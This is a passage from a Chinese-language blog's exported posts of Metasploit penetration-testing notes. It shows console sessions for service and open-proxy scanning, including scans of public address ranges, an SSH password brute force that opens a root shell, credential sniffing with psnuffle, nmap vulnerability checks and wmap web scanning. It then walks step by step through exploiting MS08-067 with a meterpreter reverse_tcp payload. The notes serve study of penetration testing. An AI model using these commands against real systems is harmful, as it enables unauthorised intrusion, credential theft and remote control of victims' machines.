auxiliary/scanner/oracle/tnslsnr_versionmsf auxiliary(tnslsnr_version) &gt; set RHOSTS 10.10.10.0/24RHOSTS =&gt; 10.10.10.0/24msf auxiliary(tnslsnr_version) &gt; set THREADS 100THREADS =&gt; 100msf auxiliary(tnslsnr_version) &gt; run[*] Scanned 101 of 256 hosts (39% complete)[+] 10.10.10.130:1521 Oracle - Version: 32-bit Windows: Version 10.2.0.1.0 - Production[*] Scanned 106 of 256 hosts (41% complete)[*] Scanned 156 of 256 hosts (60% complete)[*] Scanned 192 of 256 hosts (75% complete)[*] Scanned 201 of 256 hosts (78% complete)[*] Scanned 203 of 256 hosts (79% complete)[*] Scanned 207 of 256 hosts (80% complete)[*] Scanned 208 of 256 hosts (81% complete)[*] Scanned 236 of 256 hosts (92% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed 开放代理探测123456789101112131415161718192021222324msf auxiliary(tnslsnr_version) &gt; use auxiliary/scanner/http/open_proxymsf auxiliary(open_proxy) &gt; set SITE www.google.comSITE =&gt; www.google.commsf auxiliary(open_proxy) &gt; set RHOSTS 24.25.24.1/24RHOSTS =&gt; 24.25.24.1/24msf auxiliary(open_proxy) &gt; set MULTIPORTS trueMULTIPORTS =&gt; truemsf auxiliary(open_proxy) &gt; set VERIFY_CONNECT trueVERIFY_CONNECT =&gt; truemsf auxiliary(open_proxy) &gt; set THREADS 100THREADS =&gt; 100msf auxiliary(open_proxy) &gt; run[*] Scanned 83 of 256 hosts (32% complete)[*] Scanned 94 of 256 hosts (36% complete)[*] Scanned 95 of 256 hosts (37% complete)[*] Scanned 154 of 256 hosts (60% complete)[*] Scanned 190 of 256 hosts (74% complete)[*] Scanned 191 of 256 hosts (74% complete)[*] Scanned 206 of 256 hosts (80% complete)[*] Scanned 250 of 256 hosts (97% complete)[*] Scanned 255 of 256 hosts (99% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed SSH猜测与嗅探12345678910111213141516171819202122msf auxiliary(open_proxy) &gt; use auxiliary/scanner/ssh/ssh_login msf auxiliary(ssh_login) &gt; set USERNAME rootUSERNAME =&gt; rootmsf auxiliary(ssh_login) &gt; set PASS_FILE /root/zidian.txtPASS_FILE =&gt; /root/zidian.txtmsf auxiliary(ssh_login) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(ssh_login) &gt; set RHOSTS 10.10.10.254RHOSTS =&gt; 10.10.10.254msf auxiliary(ssh_login) &gt; run[*] 10.10.10.254:22 SSH - Starting bruteforce[-] 10.10.10.254:22 SSH - Failed: &apos;root:123456&apos;[!] No active DB -- Credential data will not be saved![-] 10.10.10.254:22 SSH - Failed: &apos;root:&apos;[-] 10.10.10.254:22 SSH - Failed: &apos;root:toor&apos;[-] 10.10.10.254:22 SSH - Failed: &apos;root:4138848&apos;[+] 10.10.10.254:22 SSH - Success: &apos;root:ubuntu&apos; &apos;uid=0(root) gid=0(root) groups=0(root) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux &apos;#爆破成功，字典文件可以自己选择[*] Command shell session 1 opened (10.10.10.200:43118 -&gt; 10.10.10.254:22) at 2017-10-26 09:17:33 +0800[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed psnuffle口令探测123456789101112msf auxiliary(ssh_login) &gt; use auxiliary/sniffer/psnuffle msf auxiliary(psnuffle) &gt; run[*] Auxiliary module execution completed[*] Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...msf auxiliary(psnuffle) &gt; [*] Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...[*] Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...[*] Loaded protocol SMB from /usr/share/metasploit-framework/data/exploits/psnuffle/smb.rb...[*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...[*] Sniffing traffic.....# 在实际的渗透过程中，只有在得到能够接入对方网络的初始访问点之后，才能方便使用psnuffle模块 网络漏洞扫描 黑盒扫描，白盒扫描OpenVAS详细内容参见P100 使用GSA详细内容参见P102 在Metasploit中使用OpenVAS12345678910111213msf &gt; load openvas[*] Welcome to OpenVAS integration by kost and averagesecurityguy.[*] [*] OpenVAS integration requires a database connection. Once the [*] database is ready, connect to the OpenVAS server using openvas_connect.[*] For additional commands use openvas_help.[*] [*] Successfully loaded plugin: OpenVASmsf &gt; openvas_connect admin your_openvas_passwd 10.10.10.128 9390 ok[*] Connecting to OpenVAS instance at 10.10.10.128:9390 with username admin...#后续步骤在P106 查找特定服务漏洞Nmap的使用123456789101112131415161718192021222324252627282930313233343536msf &gt; nmap -P0 --script=smb-check-vulns 10.10.10.130[*] exec: nmap -P0 --script=smb-check-vulns 10.10.10.130Starting Nmap 5.51SVN ( http://nmap.org ) at 2017-11-04 20:37 EDTNmap scan report for service.dvssc.com (10.10.10.130)Host is up (0.00083s latency).Not shown: 985 closed portsPORT STATE SERVICE21/tcp open ftp80/tcp open http135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds777/tcp open multiling-http1025/tcp open NFS-or-IIS1026/tcp open LSA-or-nterm1027/tcp open IIS1032/tcp open iad31521/tcp open oracle6002/tcp open X11:27001/tcp open afs3-callback7002/tcp open afs3-prserver8099/tcp open unknownMAC Address: 00:0C:29:94:E4:0E (VMware)Host script results:| smb-check-vulns: | MS08-067: VULNERABLE| Conficker: Likely CLEAN| regsvc DoS: CHECK DISABLED (add &apos;--script-args=unsafe=1&apos; to run)| SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add &apos;--script-args=unsafe=1&apos; to run)| MS06-025: CHECK DISABLED (remove &apos;safe=1&apos; argument to run)|_ MS07-029: CHECK DISABLED (remove &apos;safe=1&apos; argument to run)Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds 漏洞结果分析渗透测试信息数据库与共享（P110）metasploit数据库Metasploit中使用PostreSQL数据库Nmap与渗透测试数据库OpenVAS与渗透测试数据库共享自己的渗透测试数据库 Web应用渗透技术 OWASP Web TOP 10 SQL注入 跨站脚本 跨站伪造请求 会话认证管理缺陷 安全误配置 不安全密码存储 不安全对象参考 限制URL访问失败 缺乏传输层保护 未验证的重定向和跳转 Metasploit中的wmap Web漏洞扫描器msf &gt; load wmap.-.-.-..-.-.-..---..---.| | | || | | || | || |-&apos;`-----&apos;`-&apos;-&apos;-&apos;`-^-&apos;`-&apos;[WMAP 1.5.1] === et [ ] metasploit.com 2012[*] Successfully loaded plugin: wmapmsf &gt; helpwmap Commands============= Command Description ------- ----------- wmap_modules Manage wmap modules wmap_nodes Manage nodes wmap_run Test targets wmap_sites Manage sites wmap_targets Manage targets wmap_vulns Display web vulnsCore Commands============= Command Description ------- ----------- ? Help menu advanced Displays advanced options for one or more modules back Move back from the current context banner Display an awesome metasploit banner cd Change the current working directory color Toggle color connect Communicate with a host edit Edit the current module with $VISUAL or $EDITOR exit Exit the console get Gets the value of a context-specific variable getg Gets the value of a global variable grep Grep the output of another command help Help menu info Displays information about one or more modules irb Drop into irb scripting mode jobs Displays and manages jobs kill Kill a job load Load a framework plugin loadpath Searches for and loads modules from a path makerc Save commands entered since start to a file options Displays global options or for one or more modules popm Pops the latest module off the stack and makes it active previous Sets the previously loaded module as the current module pushm Pushes the active or list of modules onto the module stack quit Exit the console reload_all Reloads all modules from all defined module paths rename_job Rename a job resource Run the commands stored in a file route Route traffic through a session save Saves the active datastores search Searches module names and descriptions sessions Dump session listings and display information about sessions set Sets a context-specific variable to a value setg Sets a global variable to a value show Displays modules of a given type, or all modules sleep Do nothing for the specified number of seconds spool Write console output into a file as well the screen threads View and manipulate background threads unload Unload a framework plugin unset Unsets one or more context-specific variables unsetg Unsets one or more global variables use Selects a module by name version Show the framework and console library version numbersDatabase Backend Commands========================= Command Description ------- ----------- creds List all credentials in the database db_connect Connect to an existing database db_disconnect Disconnect from the current database instance db_export Export a file containing the contents of the database db_import Import a scan result file (filetype will be auto-detected) db_nmap Executes nmap and records the output automatically db_rebuild_cache Rebuilds the database-stored module cache db_status Show the current database status hosts List all hosts in the database loot List all loot in the database notes List all notes in the database services List all services in the database vulns List all vulnerabilities in the database workspace Switch between database workspacesmsf &gt; wmap_sites -a http://202.112.50.74[*] Site created.msf &gt; wmap_sites -lAvailable sites=============== Id Host Vhost Port # Pages # Forms -- ---- ----- ---- ------- ------- 0 202.112.50.74 202.112.50.74 80 0 0msf &gt; wmap_targets -t http://202.112.50.74msf &gt; wmap_run -t[*] Testing target:[*] Site: 202.112.50.74 (202.112.50.74)[*] Port: 80 SSL: false============================================================[*] Testing started. 2017-11-04 21:00:34 -0400=[ SSL testing ]=============================================================[*] Target is not SSL. SSL modules disabled.=[ Web Server testing ]=============================================================[*] Loaded auxiliary/admin/http/contentkeeper_fileaccess ...[*] Loaded auxiliary/admin/http/tomcat_administration ...[*] Loaded auxiliary/admin/http/tomcat_utf8_traversal ...[*] Loaded auxiliary/scanner/http/frontpage_login ...[*] Loaded auxiliary/scanner/http/http_version ...[*] Loaded auxiliary/scanner/http/open_proxy ...[*] Loaded auxiliary/scanner/http/options ...[*] Loaded auxiliary/scanner/http/robots_txt ...[*] Loaded auxiliary/scanner/http/svn_scanner ...[*] Loaded auxiliary/scanner/http/verb_auth_bypass ...[*] Loaded auxiliary/scanner/http/vhost_scanner ...[*] Loaded auxiliary/scanner/http/web_vulndb ...[*] Loaded auxiliary/scanner/http/webdav_internal_ip ...[*] Loaded auxiliary/scanner/http/webdav_scanner ...[*] Loaded auxiliary/scanner/http/webdav_website_content ...=[ File/Dir testing ]=============================================================[*] Loaded auxiliary/scanner/http/backup_file ...[*] Loaded auxiliary/scanner/http/brute_dirs ...[*] Loaded auxiliary/scanner/http/copy_of_file ...[*] Loaded auxiliary/scanner/http/dir_listing ...[*] Loaded auxiliary/scanner/http/dir_scanner ...[*] Loaded auxiliary/scanner/http/dir_webdav_unicode_bypass ...[*] Loaded auxiliary/scanner/http/file_same_name_dir ...[*] Loaded auxiliary/scanner/http/files_dir ...[*] Loaded auxiliary/scanner/http/ms09_020_webdav_unicode_bypass ...[*] Loaded auxiliary/scanner/http/prev_dir_same_name_file ...[*] Loaded auxiliary/scanner/http/replace_ext ...[*] Loaded auxiliary/scanner/http/trace_axd ...[*] Loaded auxiliary/scanner/http/writable ...=[ Unique Query testing ]=============================================================[*] Loaded auxiliary/scanner/http/blind_sql_query ...[*] Loaded auxiliary/scanner/http/error_sql_injection ...=[ Query testing ]==============================================================[ General testing ]=============================================================[*] Analysis completed in 4.058472156524658 seconds.[*] Done.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++msf &gt; wmap_run -e[*] Using ALL wmap enabled modules.[*] Testing target:[*] Site: 202.112.50.74 (202.112.50.74)[*] Port: 80 SSL: false============================================================[*] Testing started. 2017-11-04 21:02:27 -0400=[ SSL testing ]=============================================================[*] Target is not SSL. SSL modules disabled.=[ Web Server testing ]=============================================================Module auxiliary/admin/http/contentkeeper_fileaccess[*] Attempting to connect to 202.112.50.74:80Module auxiliary/admin/http/tomcat_administrationModule auxiliary/admin/http/tomcat_utf8_traversal[*] Attempting to connect to 202.112.50.74:80Module auxiliary/scanner/http/frontpage_loginModule auxiliary/scanner/http/http_versionModule auxiliary/scanner/http/open_proxyModule auxiliary/scanner/http/optionsModule auxiliary/scanner/http/robots_txtModule auxiliary/scanner/http/svn_scannerModule auxiliary/scanner/http/verb_auth_bypassModule auxiliary/scanner/http/vhost_scanner[*] &gt;&gt; Exception during launch from auxiliary/scanner/http/vhost_scanner: The following options failed to validate: DOMAIN.Module auxiliary/scanner/http/web_vulndb[*] &gt;&gt; Exception during launch from auxiliary/scanner/http/web_vulndb: The following options failed to validate: VULNCSV.Module auxiliary/scanner/http/webdav_internal_ipModule auxiliary/scanner/http/webdav_scannerModule auxiliary/scanner/http/webdav_website_content=[ File/Dir testing ]=============================================================msf &gt; vulns //查看扫描的信息，现在是一个不完整的信息，上面的漏洞扫描过程中止了[*] Time: 2017-09-04 11:55:41 UTC Vuln: host=10.10.10.254 name=auxiliary/scanner/ssh/ssh_login refs=CVE-1999-0502 渗透模块 （P130） Metasploit中已有的模块 Web应用漏洞扫描探测 各种Web扫描工具（P130）","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Metasploit/"}]},{"title":"Metasploit关于08_067漏洞的利用","slug":"Metasploit关于08-067漏洞的利用","date":"2019-01-13T22:08:08.000Z","updated":"2019-01-13T22:09:08.026Z","comments":true,"path":"2019/01/14/Metasploit关于08-067漏洞的利用/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit关于08-067漏洞的利用/","excerpt":"","text":"关于08_067漏洞的利用 1.打开终端 2.打开msf控制台 msfconsole 有时候会提示有一个什么数据库没有打开，按照弹出的对画框中的命令，先打开要求的那个数据库，就行了 3.查找漏洞利用模板 msf &gt; search 08_067 Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/smb/ms08_067_netapi 2008-10-28 great MS08-067 Microsoft Server Service Relative Path Stack Corruption 4.使用模板 msf &gt; use exploit/windows/smb/ms08_067_netapi 之后msf的输入变成了这样 msf exploit(ms08_067_netapi) &gt; 5.查看需要配置那些信息 msf exploit(ms08_067_netapi) &gt; show options Module options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) Exploit target: Id Name -- ---- 0 Automatic Targeting 6.设置目标电脑IP msf exploit(ms08_067_netapi) &gt; set RHOST 192.168.43.176 RHOST =&gt; 192.168.43.176 再次查看配置信息msf exploit(ms08_067_netapi) &gt; show options Module options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST 192.168.43.176 yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) Exploit target: Id Name -- ---- 0 Automatic Targeting 7.查看载荷 msf exploit(ms08_067_netapi) &gt; show payloads Compatible Payloads =================== Name Disclosure Date Rank Description ---- --------------- ---- ----------- generic/custom normal Custom Payload generic/debug_trap normal Generic x86 Debug Trap generic/shell_bind_tcp normal Generic Command Shell, Bind TCP Inline generic/shell_reverse_tcp normal Generic Command Shell, Reverse TCP Inline generic/tight_loop normal Generic x86 Tight Loop windows/adduser normal Windows Execute net user /ADD windows/dllinject/bind_hidden_ipknock_tcp normal Reflective DLL Injection, Hidden Bind Ipknock TCP Stager windows/dllinject/bind_hidden_tcp normal Reflective DLL Injection, Hidden Bind TCP Stager windows/dllinject/bind_ipv6_tcp normal Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86) windows/dllinject/bind_ipv6_tcp_uuid normal Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86) windows/dllinject/bind_nonx_tcp normal Reflective DLL Injection, Bind TCP Stager (No NX or Win7) windows/dllinject/bind_tcp normal Reflective DLL Injection, Bind TCP Stager (Windows x86) windows/dllinject/bind_tcp_rc4 normal Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption) windows/dllinject/bind_tcp_uuid normal Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86) windows/dllinject/reverse_hop_http normal Reflective DLL Injection, Reverse Hop HTTP/HTTPS Stager windows/dllinject/reverse_http normal Reflective DLL Injection, Windows Reverse HTTP Stager (wininet) windows/dllinject/reverse_ipv6_tcp normal Reflective DLL Injection, Reverse TCP Stager (IPv6) windows/dllinject/reverse_nonx_tcp normal Reflective DLL Injection, Reverse TCP Stager (No NX or Win7) windows/dllinject/reverse_ord_tcp normal Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7) windows/dllinject/reverse_tcp normal Reflective DLL Injection, Reverse TCP Stager windows/dllinject/reverse_tcp_allports normal Reflective DLL Injection, Reverse All-Port TCP Stager windows/dllinject/reverse_tcp_dns normal Reflective DLL Injection, Reverse TCP Stager (DNS) windows/dllinject/reverse_tcp_rc4 normal Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption) windows/dllinject/reverse_tcp_uuid normal Reflective DLL Injection, Reverse TCP Stager with UUID Support windows/dllinject/reverse_winhttp normal Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp) windows/dns_txt_query_exec normal DNS TXT Record Payload Download and Execution windows/exec normal Windows Execute Command windows/format_all_drives manual Windows Drive Formatter windows/loadlibrary normal Windows LoadLibrary Path windows/messagebox normal Windows MessageBox windows/meterpreter/bind_hidden_ipknock_tcp normal Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager windows/meterpreter/bind_hidden_tcp normal Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager windows/meterpreter/bind_ipv6_tcp normal Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86) windows/meterpreter/bind_ipv6_tcp_uuid normal Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86) windows/meterpreter/bind_nonx_tcp normal Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7) windows/meterpreter/bind_tcp normal Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86) windows/meterpreter/bind_tcp_rc4 normal Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption) windows/meterpreter/bind_tcp_uuid normal Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86) windows/meterpreter/reverse_hop_http normal Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager windows/meterpreter/reverse_http normal Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet) windows/meterpreter/reverse_https normal Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet) windows/meterpreter/reverse_https_proxy normal Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy windows/meterpreter/reverse_ipv6_tcp normal Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6) windows/meterpreter/reverse_nonx_tcp normal Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7) windows/meterpreter/reverse_ord_tcp normal Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7) windows/meterpreter/reverse_tcp normal Windows Meterpreter (Reflective Injection), Reverse TCP Stager windows/meterpreter/reverse_tcp_allports normal Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager windows/meterpreter/reverse_tcp_dns normal Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS) windows/meterpreter/reverse_tcp_rc4 normal Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption) windows/meterpreter/reverse_tcp_uuid normal Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support windows/meterpreter/reverse_winhttp normal Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp) windows/meterpreter/reverse_winhttps normal Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp) windows/metsvc_bind_tcp normal Windows Meterpreter Service, Bind TCP windows/metsvc_reverse_tcp normal Windows Meterpreter Service, Reverse TCP Inline windows/patchupdllinject/bind_hidden_ipknock_tcp normal Windows Inject DLL, Hidden Bind Ipknock TCP Stager windows/patchupdllinject/bind_hidden_tcp normal Windows Inject DLL, Hidden Bind TCP Stager windows/patchupdllinject/bind_ipv6_tcp normal Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86) windows/patchupdllinject/bind_ipv6_tcp_uuid normal Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86) windows/patchupdllinject/bind_nonx_tcp normal Windows Inject DLL, Bind TCP Stager (No NX or Win7) windows/patchupdllinject/bind_tcp normal Windows Inject DLL, Bind TCP Stager (Windows x86) windows/patchupdllinject/bind_tcp_rc4 normal Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption) windows/patchupdllinject/bind_tcp_uuid normal Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86) windows/patchupdllinject/reverse_ipv6_tcp normal Windows Inject DLL, Reverse TCP Stager (IPv6) windows/patchupdllinject/reverse_nonx_tcp normal Windows Inject DLL, Reverse TCP Stager (No NX or Win7) windows/patchupdllinject/reverse_ord_tcp normal Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7) windows/patchupdllinject/reverse_tcp normal Windows Inject DLL, Reverse TCP Stager windows/patchupdllinject/reverse_tcp_allports normal Windows Inject DLL, Reverse All-Port TCP Stager windows/patchupdllinject/reverse_tcp_dns normal Windows Inject DLL, Reverse TCP Stager (DNS) windows/patchupdllinject/reverse_tcp_rc4 normal Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption) windows/patchupdllinject/reverse_tcp_uuid normal Windows Inject DLL, Reverse TCP Stager with UUID Support windows/patchupmeterpreter/bind_hidden_ipknock_tcp normal Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager windows/patchupmeterpreter/bind_hidden_tcp normal Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager windows/patchupmeterpreter/bind_ipv6_tcp normal Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86) windows/patchupmeterpreter/bind_ipv6_tcp_uuid normal Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86) windows/patchupmeterpreter/bind_nonx_tcp normal Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7) windows/patchupmeterpreter/bind_tcp normal Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86) windows/patchupmeterpreter/bind_tcp_rc4 normal Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption) windows/patchupmeterpreter/bind_tcp_uuid normal Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86) windows/patchupmeterpreter/reverse_ipv6_tcp normal Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6) windows/patchupmeterpreter/reverse_nonx_tcp normal Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7) windows/patchupmeterpreter/reverse_ord_tcp normal Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7) windows/patchupmeterpreter/reverse_tcp normal Windows Meterpreter (skape/jt Injection), Reverse TCP Stager windows/patchupmeterpreter/reverse_tcp_allports normal Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager windows/patchupmeterpreter/reverse_tcp_dns normal Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS) windows/patchupmeterpreter/reverse_tcp_rc4 normal Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption) windows/patchupmeterpreter/reverse_tcp_uuid normal Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support windows/shell/bind_hidden_ipknock_tcp normal Windows Command Shell, Hidden Bind Ipknock TCP Stager windows/shell/bind_hidden_tcp normal Windows Command Shell, Hidden Bind TCP Stager windows/shell/bind_ipv6_tcp normal Windows Command Shell, Bind IPv6 TCP Stager (Windows x86) windows/shell/bind_ipv6_tcp_uuid normal Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86) windows/shell/bind_nonx_tcp normal Windows Command Shell, Bind TCP Stager (No NX or Win7) windows/shell/bind_tcp normal Windows Command Shell, Bind TCP Stager (Windows x86) windows/shell/bind_tcp_rc4 normal Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption) windows/shell/bind_tcp_uuid normal Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86) windows/shell/reverse_ipv6_tcp normal Windows Command Shell, Reverse TCP Stager (IPv6) windows/shell/reverse_nonx_tcp normal Windows Command Shell, Reverse TCP Stager (No NX or Win7) windows/shell/reverse_ord_tcp normal Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7) windows/shell/reverse_tcp normal Windows Command Shell, Reverse TCP Stager windows/shell/reverse_tcp_allports normal Windows Command Shell, Reverse All-Port TCP Stager windows/shell/reverse_tcp_dns normal Windows Command Shell, Reverse TCP Stager (DNS) windows/shell/reverse_tcp_rc4 normal Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption) windows/shell/reverse_tcp_uuid normal Windows Command Shell, Reverse TCP Stager with UUID Support windows/shell_bind_tcp normal Windows Command Shell, Bind TCP Inline windows/shell_hidden_bind_tcp normal Windows Command Shell, Hidden Bind TCP Inline windows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP Inline windows/speak_pwned normal Windows Speech API - Say &quot;You Got Pwned!&quot; windows/upexec/bind_hidden_ipknock_tcp normal Windows Upload/Execute, Hidden Bind Ipknock TCP Stager windows/upexec/bind_hidden_tcp normal Windows Upload/Execute, Hidden Bind TCP Stager windows/upexec/bind_ipv6_tcp normal Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86) windows/upexec/bind_ipv6_tcp_uuid normal Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86) windows/upexec/bind_nonx_tcp normal Windows Upload/Execute, Bind TCP Stager (No NX or Win7) windows/upexec/bind_tcp normal Windows Upload/Execute, Bind TCP Stager (Windows x86) windows/upexec/bind_tcp_rc4 normal Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption) windows/upexec/bind_tcp_uuid normal Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86) windows/upexec/reverse_ipv6_tcp normal Windows Upload/Execute, Reverse TCP Stager (IPv6) windows/upexec/reverse_nonx_tcp normal Windows Upload/Execute, Reverse TCP Stager (No NX or Win7) windows/upexec/reverse_ord_tcp normal Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7) windows/upexec/reverse_tcp normal Windows Upload/Execute, Reverse TCP Stager windows/upexec/reverse_tcp_allports normal Windows Upload/Execute, Reverse All-Port TCP Stager windows/upexec/reverse_tcp_dns normal Windows Upload/Execute, Reverse TCP Stager (DNS) windows/upexec/reverse_tcp_rc4 normal Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption) windows/upexec/reverse_tcp_uuid normal Windows Upload/Execute, Reverse TCP Stager with UUID Support windows/vncinject/bind_hidden_ipknock_tcp normal VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager windows/vncinject/bind_hidden_tcp normal VNC Server (Reflective Injection), Hidden Bind TCP Stager windows/vncinject/bind_ipv6_tcp normal VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86) windows/vncinject/bind_ipv6_tcp_uuid normal VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86) windows/vncinject/bind_nonx_tcp normal VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7) windows/vncinject/bind_tcp normal VNC Server (Reflective Injection), Bind TCP Stager (Windows x86) windows/vncinject/bind_tcp_rc4 normal VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption) windows/vncinject/bind_tcp_uuid normal VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86) windows/vncinject/reverse_hop_http normal VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager windows/vncinject/reverse_http normal VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet) windows/vncinject/reverse_ipv6_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager (IPv6) windows/vncinject/reverse_nonx_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7) windows/vncinject/reverse_ord_tcp normal VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7) windows/vncinject/reverse_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager windows/vncinject/reverse_tcp_allports normal VNC Server (Reflective Injection), Reverse All-Port TCP Stager windows/vncinject/reverse_tcp_dns normal VNC Server (Reflective Injection), Reverse TCP Stager (DNS) windows/vncinject/reverse_tcp_rc4 normal VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption) windows/vncinject/reverse_tcp_uuid normal VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support windows/vncinject/reverse_winhttp normal VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp) 8.设置载荷 msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp 这个载荷要么背下要么记得是什么，能找到也行 9.设置本地IP地址 msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.43.236 LHOST =&gt; 192.168.43.236 查看配置信息msf exploit(ms08_067_netapi) &gt; show options Module options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST 192.168.43.176 yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) LHOST 192.168.43.236 yes The listen address LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Targeting 10.查看和设置目标版本ID msf exploit(ms08_067_netapi) &gt; show targets Exploit targets: Id Name -- ---- 0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal 3 Windows 2003 SP0 Universal 4 Windows XP SP2 English (AlwaysOn NX) 5 Windows XP SP2 English (NX) 6 Windows XP SP3 English (AlwaysOn NX) 7 Windows XP SP3 English (NX) 8 Windows XP SP2 Arabic (NX) 9 Windows XP SP2 